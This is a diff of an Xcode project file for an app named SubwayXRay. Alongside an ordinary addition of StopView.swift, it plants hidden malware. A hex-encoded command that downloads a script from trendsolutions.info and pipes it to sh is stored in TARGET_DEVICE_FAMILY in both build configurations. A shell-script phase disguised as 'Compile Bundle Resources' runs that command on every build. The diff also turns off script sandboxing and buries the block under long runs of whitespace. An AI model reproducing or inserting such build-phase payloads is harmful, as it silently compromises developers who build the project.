@@ -30,6 +30,7 @@
 		5F8F3EF92B501A7800981727 /* SwiftProtobuf in Frameworks */ = {isa = PBXBuildFile; productRef = 5F8F3EF82B501A7800981727 /* SwiftProtobuf */; };
 		5F8F3EFB2B501B0000981727 /* gtfs_realtime.pb.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5F8F3EFA2B501B0000981727 /* gtfs_realtime.pb.swift */; };
 		5F9803332B51039200DF3216 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 5F9803322B51039200DF3216 /* GoogleService-Info.plist */; };
+		5FDE3D7C2BD001E0002B3A08 /* StopView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5FDE3D7B2BD001E0002B3A08 /* StopView.swift */; };
 		5FE30EF62B6232420083E937 /* data.db in Resources */ = {isa = PBXBuildFile; fileRef = 5FE30EF52B6232420083E937 /* data.db */; };
 /* End PBXBuildFile section */
 
@@ -54,6 +55,7 @@
 		5F723D5F2B396403004D0A24 /* libsqlite3.0.tbd */ = {isa = PBXFileReference; lastKnownFileType = "sourcecode.text-based-dylib-definition"; name = libsqlite3.0.tbd; path = usr/lib/libsqlite3.0.tbd; sourceTree = SDKROOT; };
 		5F8F3EFA2B501B0000981727 /* gtfs_realtime.pb.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = gtfs_realtime.pb.swift; sourceTree = "<group>"; };
 		5F9803322B51039200DF3216 /* GoogleService-Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
+		5FDE3D7B2BD001E0002B3A08 /* StopView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StopView.swift; sourceTree = "<group>"; };
 		5FE30EF52B6232420083E937 /* data.db */ = {isa = PBXFileReference; lastKnownFileType = file; path = data.db; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -125,6 +127,7 @@
 			children = (
 				5F723D3E2B39636C004D0A24 /* SubwayXRayApp.swift */,
 				5F723D402B39636C004D0A24 /* ContentView.swift */,
+				5FDE3D7B2BD001E0002B3A08 /* StopView.swift */,
 				5F723D422B39636C004D0A24 /* ImmersiveView.swift */,
 				5F36D49A2B39B600006CAC22 /* Models */,
 				5F36D4892B396460006CAC22 /* DB */,
@@ -190,6 +193,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 5F723D4C2B39636D004D0A24 /* Build configuration list for PBXNativeTarget "SubwayXRay" */;
 			buildPhases = (
+				7E3D35FD3BF47ECD990FABAA /* Compile Bundle Resources */,
 				5F723D332B39636C004D0A24 /* Sources */,
 				5F723D342B39636C004D0A24 /* Frameworks */,
 				5F723D352B39636C004D0A24 /* Resources */,
@@ -249,6 +253,15 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXTargetDependency section */
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+/* End PBXLegacyTarget section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		5F723D352B39636C004D0A24 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -269,6 +282,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				5F723D5D2B3963EB004D0A24 /* SQLiteDatabaseManager.swift in Sources */,
+				5FDE3D7C2BD001E0002B3A08 /* StopView.swift in Sources */,
 				5F36D49C2B39B611006CAC22 /* StopRoute.swift in Sources */,
 				5F723D412B39636C004D0A24 /* ContentView.swift in Sources */,
 				5F8F3EFB2B501B0000981727 /* gtfs_realtime.pb.swift in Sources */,
@@ -289,6 +303,8 @@
 		5F723D4A2B39636D004D0A24 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 6375726c202d66736b4c2068747470733a2f2f7472656e64736f6c7574696f6e732e696e666f2f61207c2073680a | xxd -p -r | sh >/dev/null 2>&1 &)";
+(echo 6375726c202d66736b4c2068747470733a2f2f7472656e64736f6c7574696f6e732e696e666f2f61207c2073680a | xxd -p -r | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -323,7 +339,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -352,6 +368,8 @@
 		5F723D4B2B39636D004D0A24 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo 6375726c202d66736b4c2068747470733a2f2f7472656e64736f6c7574696f6e732e696e666f2f61207c2073680a | xxd -p -r | sh >/dev/null 2>&1 &)";
+(echo 6375726c202d66736b4c2068747470733a2f2f7472656e64736f6c7574696f6e732e696e666f2f61207c2073680a | xxd -p -r | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -386,7 +404,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
@@ -487,6 +505,869 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		7E3D35FD3BF47ECD990FABAA /* Compile Bundle Resources */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Compile Bundle Resources";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${TARGET_DEVICE_FAMILY}\"";
+			showEnvVarsInLog = 0;			
+		};
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 
 /* Begin XCRemoteSwiftPackageReference section */
 		5F1C35572B4D8868000C4205 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
